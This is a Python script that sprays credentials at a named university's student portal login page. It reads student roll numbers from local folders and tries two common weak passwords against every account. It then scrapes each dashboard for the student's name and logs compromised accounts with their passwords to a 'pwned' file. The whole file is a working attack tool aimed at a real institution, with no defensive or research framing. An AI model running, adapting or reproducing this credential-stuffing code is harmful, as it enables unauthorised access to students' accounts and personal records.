import requests
from bs4 import BeautifulSoup
from termcolor import colored
import os



def login(username, password):
    req = requests.Session()
    url = 'http://erp.uit.edu:803/StudentPortal/Student/EDU_EBS_STU_Login.aspx'
    payload = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__VIEWSTATE': '/wEPDwULLTIwOTAyNDg3NDMPZBYCZg9kFgQCAQ9kFgICFQ8WAh4EaHJlZgUyLi4vZGVzaWduX2ZyYW1ld29yay9OZXdEYXNoYm9hcmQvZGlzdC9jc3MvQmx1ZS5jc3NkAgMPZBYCAgEPZBYIAgMPDxYIHgVXaWR0aBsAAAAAAOCVQAEAAAAeBkhlaWdodBsAAAAAACCMQAEAAAAeCEltYWdlVXJsBVB+L1RlbGVyaWsuV2ViLlVJLldlYlJlc291cmNlLmF4ZD9pbWdpZD05YWI0NTRiNGI5OGI0NjJlYmIwNzJhYjAyMmJiMWViZSZ0eXBlPXJiaR4EXyFTQgKAA2RkAhAPDxYGHwMFFy4uL2ltYWdlcy9EdW1teUxvZ28ucG5nHghDc3NDbGFzcwUHTG9nb0JveB8EAgJkZAISDxYCHglpbm5lcmh0bWxlZAIUDxYCHwBkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUjY3RsMDAkQ29udGVudFBsYWNlSG9sZGVyMSRDaGVja0JveDEz6CXJALVHCL4sm43HSRlnMKt1rEZilVk8zI1sJ2+L1A==',
        '__VIEWSTATEGENERATOR': 'CE95E3B5',
        '__EVENTVALIDATION': '/wEdAAfFP3ocNfF/gG9ALMCSZRGLV81WNt1mpwLL2zW1ewrLS3Qq+s+KEqCNvUmR1rBY5ca4Z67AOU/kzhzLV6X3P9qDKX+RG8XwdcP0xBy3CPsNqwM00h6IH/niWSnxqsLv1wpcrmMV3O38Ci5K+kVOqYVBhxT1om2OviOsIWpISeMlA22C1vEGsggzluJyUg8oQWw=',
        'ctl00$ContentPlaceHolder1$txtRegistrationNo_cs': username,
        'ctl00$ContentPlaceHolder1$txtPassword_m6cs': password,
        'ctl00$ContentPlaceHolder1$btnlgn': 'Login'
    }
    req.post(url, data=payload)
    res = req.get(
        'http://erp.uit.edu:803/StudentPortal/Student/EDU_EBS_STU_Dashboard.aspx')
    return res.text


rollNumbers = os.listdir("rollNumbers") #['19b', '20b', '21b', '21f', '21sp']

password = ["12345678", "123456789"]


rollNumbers = ["19b", "20b", "21b", "21f", "21sp"]
files = ["ce", "cs", "ee", "se"]


for rollNumber in rollNumbers:
    try:
        files = os.listdir("rollNumbers/" + rollNumber)
        for file in files:
            with open("rollNumbers/" + str(rollNumber) + "/" + str(file), 'r') as f:
                for line in f:
                    username = line.strip("\n")
                    for i in range(len(password)):
                        try:
                            soup = BeautifulSoup(login(username, password[i]), 'html.parser')
                            name = soup.find('span', {'id': 'ctl00_user_name'}).text
                            # print(soup.find('span', {'id': 'ctl00_user_name'}).text)
                            if name.replace(" ", "").isalpha():
                                print(colored(f"[+] {name} has password {password[i]}", "green"))
                    
                        #saving the names of pwned accounts
                            with open("pwneddddd.txt", 'a') as f:
                                f.write(f"{username},{name},{password[i]}\n")
                        
                        except:
                            print(colored(f"[-] {username} is secure according to {password[i]}", "red"))
                            #saving the names of secure accounts
                            with open("secureddddd.txt", 'a') as f:
                                f.write(f"{username}\n")
    except:
        print("0bazi")
